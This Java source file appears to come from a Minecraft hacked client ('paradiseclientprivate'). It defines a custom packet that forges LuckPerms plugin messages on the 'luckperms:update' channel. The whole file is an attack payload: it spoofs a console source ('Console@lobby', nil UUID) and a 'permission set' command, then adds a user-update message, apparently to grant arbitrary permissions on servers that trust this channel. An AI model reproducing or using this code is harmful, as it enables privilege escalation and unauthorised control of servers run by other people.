package io.github.spigotrce.paradiseclientprivate.packets;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.util.Identifier;

import java.util.UUID;

public record LuckPermsPayloadPacket(String uuid, String name, String permission, boolean add, UUID requestId) implements CustomPayload {
    public static final PacketCodec<PacketByteBuf, LuckPermsPayloadPacket> CODEC = CustomPayload.codecOf(LuckPermsPayloadPacket::write, LuckPermsPayloadPacket::new);
    public static final Id<LuckPermsPayloadPacket> ID = new Id<>(Identifier.of("luckperms", "update"));

    private LuckPermsPayloadPacket(PacketByteBuf buf) {
        this(buf.readString(), buf.readString(), buf.readString(), buf.readBoolean(), buf.readUuid());
    }

    public LuckPermsPayloadPacket(String uuid, String name, String permission, boolean add) {
        this(uuid, name, permission, add, UUID.randomUUID());
    }

    // Encoding method
    public void write(PacketByteBuf buf) {
        Gson gson = new Gson();

        JsonObject permissionMessage = createPermissionMessage();
        sendJsonMessage(buf, gson.toJson(permissionMessage));

        JsonObject userUpdateMessage = createUserUpdateMessage();
        sendJsonMessage(buf, gson.toJson(userUpdateMessage));
    }

    private JsonObject createPermissionMessage() {
        JsonObject message = new JsonObject();

        String messageId = UUID.randomUUID().toString();
        message.addProperty("id", messageId);
        message.addProperty("type", "log");

        JsonObject content = new JsonObject();
        content.addProperty("timestamp", System.currentTimeMillis() / 1000);

        // Source information
        JsonObject source = new JsonObject();
        source.addProperty("uniqueId", "00000000-0000-0000-0000-000000000000");
        source.addProperty("name", "Console@lobby");
        content.add("source", source);

        JsonObject target = new JsonObject();
        target.addProperty("type", "USER");
        target.addProperty("uniqueId", this.uuid);
        target.addProperty("name", this.name);
        content.add("target", target);

        content.addProperty("description", "permission set " + this.permission + (this.add ? " true" : " false"));
        message.add("content", content);

        return message;
    }

    private JsonObject createUserUpdateMessage() {
        JsonObject userUpdateMessage = new JsonObject();

        String userUpdateId = UUID.randomUUID().toString();
        userUpdateMessage.addProperty("id", userUpdateId);
        userUpdateMessage.addProperty("type", "userupdate");

        JsonObject userUpdateContent = new JsonObject();
        userUpdateContent.addProperty("userUuid", this.uuid);
        userUpdateMessage.add("content", userUpdateContent);

        return userUpdateMessage;
    }

    private void sendJsonMessage(PacketByteBuf buf, String jsonString) {
        byte[] jsonBytes = jsonString.getBytes();
        int length = jsonBytes.length;

        buf.writeByte(length);

        buf.writeBytes(jsonBytes);
    }

    @Override
    public Id<LuckPermsPayloadPacket> getId() {
        return ID;
    }
}